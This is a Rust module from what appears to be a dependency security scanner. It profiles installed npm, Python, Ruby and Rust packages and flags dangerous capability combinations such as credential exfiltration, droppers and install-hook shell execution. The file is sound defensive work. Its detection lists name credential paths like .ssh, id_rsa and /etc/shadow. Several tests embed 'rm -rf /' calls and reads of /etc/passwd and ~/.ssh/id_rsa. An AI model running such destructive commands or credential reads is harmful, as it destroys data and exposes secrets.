use std::collections::{HashMap, HashSet};
use std::path::Path;

use walkdir::WalkDir;

use crate::checks::{Check, CheckResult, Confidence, Finding, ScanContext, Severity};

/// Capability flags detected per package
#[derive(Debug, Default, Clone)]
struct PackageCapabilities {
    network: bool,         // C1: imports http/https/net/dgram/dns/fetch/axios etc.
    fs_read: bool,         // C2: imports fs + read operations
    fs_write: bool,        // C3: imports fs + write operations
    shell_exec: bool,      // C4: imports child_process
    env_access: bool,      // C5: process.env access
    credential_read: bool, // C6: fs read targeting sensitive paths
    install_hook: bool,    // C7: postinstall/preinstall in package.json
    dynamic_load: bool,    // C8: require(variable) or import(variable)
    obfuscated: bool,      // C9: obfuscation detected
}

impl PackageCapabilities {
    fn capabilities_list(&self) -> Vec<&'static str> {
        let mut caps = Vec::new();
        if self.network {
            caps.push("network");
        }
        if self.fs_read {
            caps.push("fs_read");
        }
        if self.fs_write {
            caps.push("fs_write");
        }
        if self.shell_exec {
            caps.push("shell_exec");
        }
        if self.env_access {
            caps.push("env_access");
        }
        if self.credential_read {
            caps.push("credential_read");
        }
        if self.install_hook {
            caps.push("install_hook");
        }
        if self.dynamic_load {
            caps.push("dynamic_load");
        }
        if self.obfuscated {
            caps.push("obfuscated");
        }
        caps
    }

    fn has_any(&self) -> bool {
        self.network
            || self.fs_read
            || self.fs_write
            || self.shell_exec
            || self.env_access
            || self.credential_read
            || self.install_hook
            || self.dynamic_load
            || self.obfuscated
    }
}

// --- Module lists for capability detection ---

// --- JavaScript/Node.js module lists ---

const JS_NETWORK_MODULES: &[&str] = &[
    "http",
    "https",
    "net",
    "dgram",
    "dns",
    "http2",
    "node:http",
    "node:https",
    "node:net",
    "node:dgram",
    "node:dns",
    "node:http2",
    "axios",
    "node-fetch",
    "request",
    "got",
    "superagent",
    "undici",
    "cross-fetch",
    "isomorphic-fetch",
];

const JS_EXEC_MODULES: &[&str] = &["child_process", "node:child_process"];

const JS_FS_MODULES: &[&str] = &["fs", "fs/promises", "node:fs", "node:fs/promises"];

// --- Python module lists ---

const PY_NETWORK_MODULES: &[&str] = &[
    "requests",
    "urllib",
    "urllib3",
    "httpx",
    "aiohttp",
    "socket",
    "http.client",
    "http",
    "pycurl",
    "treq",
];

const PY_EXEC_MODULES: &[&str] = &["subprocess", "os"];

const PY_FS_MODULES: &[&str] = &["pathlib", "shutil", "os.path", "os", "io"];

// --- Ruby module lists ---

const RB_NETWORK_MODULES: &[&str] = &[
    "net/http",
    "httparty",
    "faraday",
    "rest-client",
    "typhoeus",
    "open-uri",
    "excon",
    "curb",
    "httpclient",
];

const RB_EXEC_MODULES: &[&str] = &["open3", "shellwords"];

// --- Rust module lists ---

const RS_NETWORK_MODULES: &[&str] = &[
    "reqwest",
    "hyper",
    "ureq",
    "surf",
    "attohttpc",
    "isahc",
    "curl",
];

const RS_EXEC_KEYWORDS: &[&str] = &["Command::new", "std::process::Command"];

const FS_READ_METHODS: &[&str] = &[
    "readFile",
    "readFileSync",
    "createReadStream",
    "readdir",
    "readdirSync",
    "access",
    "accessSync",
];

const FS_WRITE_METHODS: &[&str] = &[
    "writeFile",
    "writeFileSync",
    "createWriteStream",
    "copyFile",
    "copyFileSync",
    "rename",
    "renameSync",
    "appendFile",
    "appendFileSync",
    "mkdir",
    "mkdirSync",
    "unlink",
    "unlinkSync",
];

const CREDENTIAL_PATHS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".npmrc",
    ".env",
    ".docker/config",
    ".kube/config",
    "id_rsa",
    "credentials",
    "/etc/passwd",
    "/etc/shadow",
];

// No built-in allowlist — any package can be compromised (event-stream, ua-parser-js, colors.js).
// Trust is earned by behavior analysis, not package identity. Users can add their own
// allowlist via config if they explicitly choose to trust specific packages.

// --- Combination rules ---

struct CombinationRule {
    name: &'static str,
    /// Capability check function — returns true if this combination is present
    check: fn(&PackageCapabilities) -> bool,
    severity: Severity,
    message: &'static str,
    suggestion: &'static str,
}

const COMBINATION_RULES: &[CombinationRule] = &[
    CombinationRule {
        name: "credential-exfiltration",
        check: |c| c.credential_read && c.network,
        severity: Severity::Critical,
        message: "reads credential files AND makes network requests — potential exfiltration",
        suggestion: "Remove immediately — no legitimate package reads your credentials and sends them over the network",
    },
    CombinationRule {
        name: "dropper",
        check: |c| c.shell_exec && c.network,
        severity: Severity::Critical,
        message: "executes shell commands AND makes network requests — potential dropper/C2",
        suggestion: "Review carefully — this combination can download and execute arbitrary code",
    },
    CombinationRule {
        name: "install-exec",
        check: |c| c.install_hook && c.shell_exec,
        severity: Severity::Critical,
        message: "install script with shell execution — common malware entry vector",
        suggestion: "Install hooks that spawn shells are the #1 supply chain attack pattern",
    },
    CombinationRule {
        name: "install-network",
        check: |c| c.install_hook && c.network,
        severity: Severity::High,
        message: "install script with network access — review for second-stage downloads",
        suggestion: "Legitimate install scripts rarely need network access — investigate what it downloads",
    },
    CombinationRule {
        name: "obfuscated-dynamic",
        check: |c| c.dynamic_load && c.obfuscated,
        severity: Severity::Critical,
        message: "dynamic loading with obfuscation — capabilities hidden, likely malicious",
        suggestion: "This package hides what modules it loads AND uses obfuscation — strong malware indicator",
    },
    CombinationRule {
        name: "env-exfiltration",
        check: |c| c.env_access && c.network,
        severity: Severity::High,
        message: "accesses environment variables AND makes network requests — potential secret exfiltration",
        suggestion: "Check if env vars are sent over the network — legitimate logging should filter secrets",
    },
    CombinationRule {
        name: "payload-staging",
        check: |c| c.fs_write && c.shell_exec,
        severity: Severity::High,
        message: "writes files AND executes commands — potential payload staging",
        suggestion: "This combination can write a payload to disk and execute it",
    },
    CombinationRule {
        name: "dynamic-install",
        check: |c| c.dynamic_load && c.install_hook,
        severity: Severity::High,
        message: "dynamic loading in package with install hook — hidden capabilities during install",
        suggestion: "Install hooks should use static imports — dynamic loading hides intent",
    },
];

// --- Check implementation ---

pub struct CapabilitiesCheck;

impl Check for CapabilitiesCheck {
    fn name(&self) -> &str {
        "capabilities"
    }

    fn run(&self, ctx: &ScanContext) -> anyhow::Result<CheckResult> {
        let max_score = ctx.config.scoring.weight_for("capabilities") as f64;

        let user_allow = &ctx.config.capabilities.allow;
        let mut findings = Vec::new();
        let mut packages_scanned = 0;
        let mut packages_with_caps = 0;

        // Dependency directories to scan (all ecosystems)
        let dep_dirs: Vec<(&str, std::path::PathBuf)> = vec![
            ("npm", ctx.root.join("node_modules")),
            ("pip", ctx.root.join(".venv")),
            ("pip", ctx.root.join("venv")),
            ("gem", ctx.root.join("vendor")),
        ];

        let mut any_dep_dir_exists = false;

        for (ecosystem, dep_dir) in &dep_dirs {
            if !dep_dir.exists() {
                continue;
            }
            any_dep_dir_exists = true;

            // For Python venvs, scan site-packages
            let scan_root = if *ecosystem == "pip" {
                // Find site-packages under .venv/lib/pythonX.Y/site-packages
                find_site_packages(dep_dir).unwrap_or_else(|| dep_dir.clone())
            } else if *ecosystem == "gem" {
                // vendor/bundle/ruby/X.Y.Z/gems/
                find_gem_dir(dep_dir).unwrap_or_else(|| dep_dir.clone())
            } else {
                dep_dir.clone()
            };

            if !scan_root.exists() {
                continue;
            }

            let entries = match std::fs::read_dir(&scan_root) {
                Ok(e) => e,
                Err(_) => continue,
            };

            for entry in entries.flatten() {
                let path = entry.path();
                if !path.is_dir() {
                    continue;
                }

                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

                if dir_name.starts_with('.') || dir_name.starts_with('_') {
                    continue;
                }

                if dir_name.starts_with('@') {
                    // Scoped packages (npm)
                    if let Ok(scoped) = std::fs::read_dir(&path) {
                        for sub in scoped.flatten() {
                            let sub_path = sub.path();
                            if sub_path.is_dir() {
                                let pkg_name = format!(
                                    "{}/{}",
                                    dir_name,
                                    sub_path.file_name().and_then(|n| n.to_str()).unwrap_or("")
                                );
                                if let Some(caps) = scan_package(&sub_path) {
                                    packages_scanned += 1;
                                    if caps.has_any() {
                                        packages_with_caps += 1;
                                        evaluate_package(
                                            &pkg_name,
                                            &caps,
                                            user_allow,
                                            &mut findings,
                                        );
                                    }
                                }
                            }
                        }
                    }
                } else if let Some(caps) = scan_package(&path) {
                    packages_scanned += 1;
                    if caps.has_any() {
                        packages_with_caps += 1;
                        evaluate_package(dir_name, &caps, user_allow, &mut findings);
                    }
                }
            }
        }

        if !any_dep_dir_exists {
            return Ok(CheckResult::new(
                "capabilities",
                vec![],
                max_score,
                vec!["No dependency directories found — skipping capability analysis".into()],
            ));
        }

        let pass_messages = vec![format!(
            "{packages_scanned} packages scanned, {packages_with_caps} with capabilities, {} dangerous combinations found",
            findings.len()
        )];

        Ok(CheckResult::new(
            "capabilities",
            findings,
            max_score,
            pass_messages,
        ))
    }
}

/// Source file extensions supported for capability analysis
const CAP_SOURCE_EXTENSIONS: &[&str] = &[
    "js", "mjs", "cjs", "ts", "mts", "cts", "jsx", "tsx", // JS/TS
    "py", "pyw", // Python
    "rb", "rake", "gemspec", // Ruby
    "rs",      // Rust
];

/// Scan all source files in a package directory to build capability profile.
/// Supports JS/TS, Python, Ruby, and Rust source files.
/// Uses a two-pass approach to correctly detect cross-file capability combinations:
/// Pass 1: detect base capabilities (network, fs_read, shell_exec, etc.)
/// Pass 2: check credential paths across ALL files using aggregated fs_read state
fn scan_package(pkg_dir: &Path) -> Option<PackageCapabilities> {
    let mut caps = PackageCapabilities::default();

    // Check package.json for JS install hooks
    let pkg_json = pkg_dir.join("package.json");
    if pkg_json.exists() {
        if let Ok(content) = std::fs::read_to_string(&pkg_json) {
            if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) {
                if let Some(scripts) = parsed.get("scripts").and_then(|s| s.as_object()) {
                    if scripts.contains_key("preinstall")
                        || scripts.contains_key("postinstall")
                        || scripts.contains_key("install")
                    {
                        caps.install_hook = true;
                    }
                }
            }
        }
    }

    // Check setup.py for Python install hooks
    let setup_py = pkg_dir.join("setup.py");
    if setup_py.exists() {
        if let Ok(content) = std::fs::read_to_string(&setup_py) {
            if content.contains("cmdclass") {
                caps.install_hook = true;
            }
        }
    }

    // Check for build.rs (Rust build script = install hook equivalent)
    if pkg_dir.join("build.rs").exists() {
        caps.install_hook = true;
    }

    // Pass 1: Scan source files and buffer contents for cross-file analysis
    let mut file_contents: Vec<String> = Vec::new();

    for entry in WalkDir::new(pkg_dir)
        .max_depth(5)
        .follow_links(false)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");

        if !CAP_SOURCE_EXTENSIONS.contains(&ext) {
            continue;
        }

        // Skip large files, test files, declaration files
        if let Ok(meta) = path.metadata() {
            if meta.len() > 500_000 {
                continue;
            }
        }
        let filename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if filename.ends_with(".d.ts")
            || filename.ends_with(".d.mts")
            || filename.ends_with(".test.js")
            || filename.ends_with(".spec.js")
            || filename.ends_with(".min.js")
            || filename.starts_with("test_")
            || filename.ends_with("_test.py")
            || filename.ends_with("_spec.rb")
        {
            continue;
        }

        let content = match std::fs::read_to_string(path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        detect_capabilities_by_ext(ext, &content, &mut caps);
        file_contents.push(content);
    }

    // Pass 2: Cross-file credential path check.
    if caps.fs_read && !caps.credential_read {
        for content in &file_contents {
            if CREDENTIAL_PATHS.iter().any(|p| content.contains(p)) {
                caps.credential_read = true;
                break;
            }
        }
    }

    Some(caps)
}

/// Detect capabilities from JS/TS file content
fn detect_capabilities_js(content: &str, caps: &mut PackageCapabilities) {
    // C1: Network capability
    if !caps.network {
        for module in JS_NETWORK_MODULES {
            if content.contains(module) {
                let pattern = format!("require('{module}')");
                let pattern2 = format!("require(\"{module}\")");
                let pattern3 = format!("from '{module}'");
                let pattern4 = format!("from \"{module}\"");
                if content.contains(&pattern)
                    || content.contains(&pattern2)
                    || content.contains(&pattern3)
                    || content.contains(&pattern4)
                {
                    caps.network = true;
                    break;
                }
            }
        }
    }

    // C4: Shell execution
    if !caps.shell_exec {
        for module in JS_EXEC_MODULES {
            let pattern = format!("require('{module}')");
            let pattern2 = format!("require(\"{module}\")");
            let pattern3 = format!("from '{module}'");
            let pattern4 = format!("from \"{module}\"");
            if content.contains(&pattern)
                || content.contains(&pattern2)
                || content.contains(&pattern3)
                || content.contains(&pattern4)
            {
                caps.shell_exec = true;
                break;
            }
        }
    }

    // C2/C3: Filesystem access
    if !caps.fs_read || !caps.fs_write {
        let has_fs_import = JS_FS_MODULES.iter().any(|m| {
            let p1 = format!("require('{m}')");
            let p2 = format!("require(\"{m}\")");
            let p3 = format!("from '{m}'");
            let p4 = format!("from \"{m}\"");
            content.contains(&p1)
                || content.contains(&p2)
                || content.contains(&p3)
                || content.contains(&p4)
        });

        if has_fs_import {
            if !caps.fs_read {
                caps.fs_read = FS_READ_METHODS.iter().any(|m| content.contains(m));
            }
            if !caps.fs_write {
                caps.fs_write = FS_WRITE_METHODS.iter().any(|m| content.contains(m));
            }
        }
    }

    // C5: Environment access
    if !caps.env_access && content.contains("process.env") {
        caps.env_access = true;
    }

    // C8: Dynamic loading
    if !caps.dynamic_load {
        let has_dynamic = content.contains("require(")
            && content.lines().any(|line| {
                if let Some(pos) = line.find("require(") {
                    let after = &line[pos + 8..];
                    let trimmed = after.trim_start();
                    !trimmed.is_empty()
                        && !trimmed.starts_with('\'')
                        && !trimmed.starts_with('"')
                        && !trimmed.starts_with('`')
                        && !trimmed.starts_with(')')
                } else {
                    false
                }
            });
        if has_dynamic {
            caps.dynamic_load = true;
        }
    }

    // C9: Obfuscation indicators
    if !caps.obfuscated
        && (content.contains("_0x")
            || content.contains("while(!![])")
            || content.contains("while (!![]) ")
            || (content.contains("String.fromCharCode")
                && content.contains("charCodeAt")
                && content.contains("^")))
    {
        caps.obfuscated = true;
    }
}

/// Detect capabilities from Python file content
fn detect_capabilities_python(content: &str, caps: &mut PackageCapabilities) {
    // Network
    if !caps.network {
        for module in PY_NETWORK_MODULES {
            let p1 = format!("import {module}");
            let p2 = format!("from {module}");
            if content.contains(&p1) || content.contains(&p2) {
                caps.network = true;
                break;
            }
        }
    }

    // Shell execution
    if !caps.shell_exec {
        for module in PY_EXEC_MODULES {
            let p1 = format!("import {module}");
            let p2 = format!("from {module}");
            if content.contains(&p1) || content.contains(&p2) {
                // For 'os', verify it's used for exec not just paths
                if *module == "os"
                    && !(content.contains("os.system")
                        || content.contains("os.popen")
                        || content.contains("os.exec"))
                {
                    continue;
                }
                caps.shell_exec = true;
                break;
            }
        }
    }

    // Filesystem access
    if !caps.fs_read || !caps.fs_write {
        let has_fs = PY_FS_MODULES.iter().any(|m| {
            let p1 = format!("import {m}");
            let p2 = format!("from {m}");
            content.contains(&p1) || content.contains(&p2)
        }) || content.contains("open(");

        if has_fs {
            if !caps.fs_read
                && (content.contains("open(")
                    || content.contains(".read(")
                    || content.contains("Path("))
            {
                caps.fs_read = true;
            }
            if !caps.fs_write
                && (content.contains("'w'")
                    || content.contains("\"w\"")
                    || content.contains("shutil.copy")
                    || content.contains("shutil.move"))
            {
                caps.fs_write = true;
            }
        }
    }

    // Environment access
    if !caps.env_access && (content.contains("os.environ") || content.contains("os.getenv")) {
        caps.env_access = true;
    }

    // Dynamic loading
    if !caps.dynamic_load && (content.contains("__import__(") || content.contains("importlib")) {
        caps.dynamic_load = true;
    }

    // Install hook: setup.py with cmdclass
    if !caps.install_hook && content.contains("cmdclass") && content.contains("setup(") {
        caps.install_hook = true;
    }
}

/// Detect capabilities from Ruby file content
fn detect_capabilities_ruby(content: &str, caps: &mut PackageCapabilities) {
    // Network
    if !caps.network {
        for module in RB_NETWORK_MODULES {
            let p1 = format!("require '{module}'");
            let p2 = format!("require \"{module}\"");
            if content.contains(&p1) || content.contains(&p2) {
                caps.network = true;
                break;
            }
        }
        // Also check for URI.parse / Net::HTTP usage without require
        if !caps.network
            && (content.contains("Net::HTTP")
                || content.contains("URI.parse")
                || content.contains("HTTParty"))
        {
            caps.network = true;
        }
    }

    // Shell execution
    if !caps.shell_exec {
        for module in RB_EXEC_MODULES {
            let p1 = format!("require '{module}'");
            let p2 = format!("require \"{module}\"");
            if content.contains(&p1) || content.contains(&p2) {
                caps.shell_exec = true;
                break;
            }
        }
        // Also check for bare system/exec/backtick
        if !caps.shell_exec
            && (content.contains("system(")
                || content.contains("exec(")
                || content.contains("IO.popen")
                || content.contains('`'))
        {
            caps.shell_exec = true;
        }
    }

    // Filesystem access
    if !caps.fs_read || !caps.fs_write {
        if !caps.fs_read
            && (content.contains("File.read")
                || content.contains("File.open")
                || content.contains("IO.read")
                || content.contains("File.exist"))
        {
            caps.fs_read = true;
        }
        if !caps.fs_write
            && (content.contains("File.write")
                || content.contains("FileUtils.cp")
                || content.contains("FileUtils.mv")
                || content.contains("FileUtils.mkdir"))
        {
            caps.fs_write = true;
        }
    }

    // Environment access
    if !caps.env_access && (content.contains("ENV[") || content.contains("ENV.fetch")) {
        caps.env_access = true;
    }

    // Dynamic loading
    if !caps.dynamic_load {
        // Check for require with variable (not string literal)
        if content.contains("Kernel.load") {
            caps.dynamic_load = true;
        }
    }

    // Install hook: gemspec with extensions
    if !caps.install_hook
        && content.contains("extensions")
        && content.contains("Gem::Specification")
    {
        caps.install_hook = true;
    }
}

/// Detect capabilities from Rust file content
fn detect_capabilities_rust(content: &str, caps: &mut PackageCapabilities) {
    // Network
    if !caps.network {
        for module in RS_NETWORK_MODULES {
            let p1 = format!("use {module}");
            let p2 = format!("extern crate {module}");
            if content.contains(&p1) || content.contains(&p2) {
                caps.network = true;
                break;
            }
        }
        // std::net
        if !caps.network && content.contains("std::net") {
            caps.network = true;
        }
    }

    // Shell execution
    if !caps.shell_exec {
        for kw in RS_EXEC_KEYWORDS {
            if content.contains(kw) {
                caps.shell_exec = true;
                break;
            }
        }
    }

    // Filesystem access
    if !caps.fs_read || !caps.fs_write {
        if !caps.fs_read
            && (content.contains("std::fs::read")
                || content.contains("File::open")
                || content.contains("fs::read"))
        {
            caps.fs_read = true;
        }
        if !caps.fs_write
            && (content.contains("std::fs::write")
                || content.contains("File::create")
                || content.contains("fs::write"))
        {
            caps.fs_write = true;
        }
    }

    // Environment access
    if !caps.env_access
        && (content.contains("std::env")
            || content.contains("env::var")
            || content.contains("env::vars"))
    {
        caps.env_access = true;
    }

    // FFI / unsafe (relevant for Rust-specific risk)
    if !caps.dynamic_load && (content.contains("libloading") || content.contains("dlopen")) {
        caps.dynamic_load = true;
    }

    // Build script = install hook equivalent
    if !caps.install_hook && content.contains("fn main()") {
        // Only flag build.rs files (checked by caller via filename)
    }
}

/// Dispatch capability detection based on file extension
fn detect_capabilities_by_ext(ext: &str, content: &str, caps: &mut PackageCapabilities) {
    match ext {
        "js" | "mjs" | "cjs" | "ts" | "mts" | "cts" | "jsx" | "tsx" => {
            detect_capabilities_js(content, caps);
        }
        "py" | "pyw" => {
            detect_capabilities_python(content, caps);
        }
        "rb" | "rake" | "gemspec" => {
            detect_capabilities_ruby(content, caps);
        }
        "rs" => {
            detect_capabilities_rust(content, caps);
        }
        _ => {}
    }

    // C6: Credential file read (language-neutral)
    if !caps.credential_read && caps.fs_read {
        for cred_path in CREDENTIAL_PATHS {
            if content.contains(cred_path) {
                caps.credential_read = true;
                break;
            }
        }
    }
}

/// Find Python site-packages directory under a venv
fn find_site_packages(venv_dir: &Path) -> Option<std::path::PathBuf> {
    let lib_dir = venv_dir.join("lib");
    if !lib_dir.exists() {
        return None;
    }
    // Look for lib/pythonX.Y/site-packages
    if let Ok(entries) = std::fs::read_dir(&lib_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with("python") {
                let sp = entry.path().join("site-packages");
                if sp.exists() {
                    return Some(sp);
                }
            }
        }
    }
    None
}

/// Find Ruby gems directory under vendor/bundle
fn find_gem_dir(vendor_dir: &Path) -> Option<std::path::PathBuf> {
    let bundle_dir = vendor_dir.join("bundle");
    if !bundle_dir.exists() {
        return None;
    }
    // vendor/bundle/ruby/X.Y.Z/gems/
    let ruby_dir = bundle_dir.join("ruby");
    if !ruby_dir.exists() {
        return None;
    }
    if let Ok(entries) = std::fs::read_dir(&ruby_dir) {
        for entry in entries.flatten() {
            let gems = entry.path().join("gems");
            if gems.exists() {
                return Some(gems);
            }
        }
    }
    None
}

/// Evaluate a package's capabilities against combination rules.
/// Only user-configured allowlists suppress findings — no built-in allowlist.
fn evaluate_package(
    pkg_name: &str,
    caps: &PackageCapabilities,
    user_allow: &HashMap<String, Vec<String>>,
    findings: &mut Vec<Finding>,
) {
    // User allowlist only — user explicitly chooses to trust specific packages
    let mut allowed: HashSet<&str> = HashSet::new();
    if let Some(user_caps) = user_allow.get(pkg_name) {
        for cap in user_caps {
            allowed.insert(cap.as_str());
        }
    }

    for rule in COMBINATION_RULES {
        if (rule.check)(caps) {
            // If user explicitly allowed all involved capabilities, suppress
            if !allowed.is_empty() {
                let detected = caps.capabilities_list();
                if detected.iter().all(|cap| allowed.contains(cap)) {
                    continue;
                }
            }

            let cap_list = caps.capabilities_list().join(", ");
            findings.push(
                Finding::new(
                    format!("DEPSEC-CAP:{}", rule.name),
                    rule.severity,
                    format!(
                        "Package '{}' {}\n  Capabilities: [{}]",
                        pkg_name, rule.message, cap_list
                    ),
                )
                .with_confidence(Confidence::High)
                .with_suggestion(rule.suggestion)
                .with_package(Some(pkg_name.to_string())),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_network_require() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("const http = require('http');\nhttp.get('url');", &mut caps);
        assert!(
            caps.network,
            "Should detect network capability from require('http')"
        );
    }

    #[test]
    fn test_detect_network_import() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("import fetch from 'node-fetch';", &mut caps);
        assert!(
            caps.network,
            "Should detect network capability from import node-fetch"
        );
    }

    #[test]
    fn test_detect_shell_exec() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js(
            "const cp = require('child_process');\ncp.exec('ls');",
            &mut caps,
        );
        assert!(caps.shell_exec, "Should detect shell exec capability");
    }

    #[test]
    fn test_detect_fs_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js(
            "const fs = require('fs');\nfs.readFileSync('file.txt');",
            &mut caps,
        );
        assert!(caps.fs_read, "Should detect fs read capability");
        assert!(!caps.fs_write, "Should NOT detect fs write");
    }

    #[test]
    fn test_detect_fs_write() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js(
            "const fs = require('fs');\nfs.writeFileSync('out.txt', data);",
            &mut caps,
        );
        assert!(caps.fs_write, "Should detect fs write capability");
    }

    #[test]
    fn test_detect_env_access() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("const key = process.env.API_KEY;", &mut caps);
        assert!(caps.env_access, "Should detect env access");
    }

    #[test]
    fn test_detect_credential_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_by_ext(
            "js",
            "const fs = require('fs');\nconst key = fs.readFileSync('~/.ssh/id_rsa');",
            &mut caps,
        );
        assert!(caps.fs_read);
        assert!(caps.credential_read, "Should detect credential file read");
    }

    #[test]
    fn test_detect_dynamic_load() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("const m = require(decoded);", &mut caps);
        assert!(caps.dynamic_load, "Should detect dynamic require");
    }

    #[test]
    fn test_static_require_not_dynamic() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("const fs = require('fs');", &mut caps);
        assert!(
            !caps.dynamic_load,
            "Static require should NOT be flagged as dynamic"
        );
    }

    #[test]
    fn test_detect_obfuscation() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js("function _0x3a2f() { while (!![]) { break; } }", &mut caps);
        assert!(caps.obfuscated, "Should detect obfuscation");
    }

    #[test]
    fn test_clean_package_no_capabilities() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_js(
            "module.exports = function add(a, b) { return a + b; };",
            &mut caps,
        );
        assert!(!caps.has_any(), "Clean code should have no capabilities");
    }

    #[test]
    fn test_combination_credential_exfiltration() {
        let caps = PackageCapabilities {
            credential_read: true,
            network: true,
            fs_read: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "DEPSEC-CAP:credential-exfiltration"),
            "Should flag credential exfiltration combo"
        );
    }

    #[test]
    fn test_combination_dropper() {
        let caps = PackageCapabilities {
            shell_exec: true,
            network: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        assert!(
            findings.iter().any(|f| f.rule_id == "DEPSEC-CAP:dropper"),
            "Should flag dropper combo"
        );
    }

    #[test]
    fn test_no_builtin_allowlist() {
        // No built-in allowlist — even well-known packages trigger findings on suspicious combos
        // Any package can be compromised (event-stream, ua-parser-js, colors.js)
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("express", &caps, &HashMap::new(), &mut findings);
        assert!(
            !findings.is_empty(),
            "No built-in allowlist — express with network+shell_exec should produce findings"
        );
    }

    #[test]
    fn test_user_allowlist() {
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            ..Default::default()
        };
        let mut user_allow = HashMap::new();
        user_allow.insert(
            "my-build-tool".to_string(),
            vec!["network".to_string(), "shell_exec".to_string()],
        );
        let mut findings = Vec::new();
        evaluate_package("my-build-tool", &caps, &user_allow, &mut findings);
        assert!(
            findings.is_empty(),
            "User-allowed capabilities should not produce findings"
        );
    }

    #[test]
    fn test_user_allowlist_partial_does_not_suppress() {
        let caps = PackageCapabilities {
            network: true,
            shell_exec: true,
            credential_read: true, // NOT in user allowlist
            fs_read: true,
            ..Default::default()
        };
        let mut user_allow = HashMap::new();
        user_allow.insert(
            "my-tool".to_string(),
            vec!["network".to_string(), "shell_exec".to_string()],
        );
        let mut findings = Vec::new();
        evaluate_package("my-tool", &caps, &user_allow, &mut findings);
        assert!(
            !findings.is_empty(),
            "Partially allowed capabilities should still produce findings"
        );
    }

    #[test]
    fn test_obfuscated_dynamic_critical() {
        let caps = PackageCapabilities {
            dynamic_load: true,
            obfuscated: true,
            ..Default::default()
        };
        let mut findings = Vec::new();
        evaluate_package("evil-pkg", &caps, &HashMap::new(), &mut findings);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-CAP:obfuscated-dynamic")
            .collect();
        assert_eq!(critical.len(), 1);
        assert_eq!(critical[0].severity, Severity::Critical);
    }

    // --- Python capability detection ---

    #[test]
    fn test_python_network_requests() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python(
            "import requests\nrequests.get('http://example.com')",
            &mut caps,
        );
        assert!(caps.network, "Should detect network from import requests");
    }

    #[test]
    fn test_python_network_urllib() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python("from urllib.request import urlopen", &mut caps);
        assert!(caps.network, "Should detect network from urllib");
    }

    #[test]
    fn test_python_shell_subprocess() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python(
            "import subprocess\nsubprocess.call(cmd, shell=True)",
            &mut caps,
        );
        assert!(caps.shell_exec, "Should detect shell exec from subprocess");
    }

    #[test]
    fn test_python_shell_os_system() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python("import os\nos.system('rm -rf /')", &mut caps);
        assert!(caps.shell_exec, "Should detect shell exec from os.system");
    }

    #[test]
    fn test_python_env_access() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python("key = os.environ['API_KEY']", &mut caps);
        assert!(caps.env_access, "Should detect env access from os.environ");
    }

    #[test]
    fn test_python_dynamic_import() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python("mod = __import__(name)", &mut caps);
        assert!(
            caps.dynamic_load,
            "Should detect dynamic loading from __import__"
        );
    }

    #[test]
    fn test_python_fs_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python("f = open('/etc/passwd')\ndata = f.read()", &mut caps);
        assert!(caps.fs_read, "Should detect fs read from open()");
    }

    #[test]
    fn test_python_install_hook() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_python(
            "from setuptools import setup\nsetup(cmdclass={'install': MyInstall})",
            &mut caps,
        );
        assert!(
            caps.install_hook,
            "Should detect install hook from cmdclass"
        );
    }

    // --- Ruby capability detection ---

    #[test]
    fn test_ruby_network_net_http() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("require 'net/http'\nNet::HTTP.get(uri)", &mut caps);
        assert!(caps.network, "Should detect network from net/http");
    }

    #[test]
    fn test_ruby_network_httparty() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("require 'httparty'\nHTTParty.get(url)", &mut caps);
        assert!(caps.network, "Should detect network from httparty");
    }

    #[test]
    fn test_ruby_shell_system() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("system('rm -rf /')", &mut caps);
        assert!(caps.shell_exec, "Should detect shell exec from system()");
    }

    #[test]
    fn test_ruby_shell_backtick() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("`ls -la`", &mut caps);
        assert!(caps.shell_exec, "Should detect shell exec from backticks");
    }

    #[test]
    fn test_ruby_env_access() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("key = ENV['API_KEY']", &mut caps);
        assert!(caps.env_access, "Should detect env access from ENV[]");
    }

    #[test]
    fn test_ruby_fs_read() {
        let mut caps = PackageCapabilities::default();
        detect_capabilities_ruby("data = File.read('/etc/passwd')", &mut caps);
        assert!(caps.fs_read, "Should detect fs read from File.read");
    }

